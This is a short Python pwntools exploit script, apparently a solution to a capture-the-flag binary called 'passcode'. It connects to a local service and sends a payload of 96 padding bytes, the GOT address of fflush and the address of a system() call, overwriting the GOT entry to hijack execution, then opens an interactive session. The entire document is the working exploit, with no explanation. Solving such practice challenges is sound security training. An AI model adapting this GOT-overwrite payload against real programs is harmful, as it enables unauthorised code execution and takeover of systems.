#!/usr/bin/python 

from pwn import *

#target = process('/home/passcode/passcode')
target = remote('127.0.0.1',1234)

fflush_got = 0x0804a004

system_addr = 0x80485e3

payload = "A" * 96 + p32(fflush_got) + str(system_addr)

target.send(payload)

target.interactive()
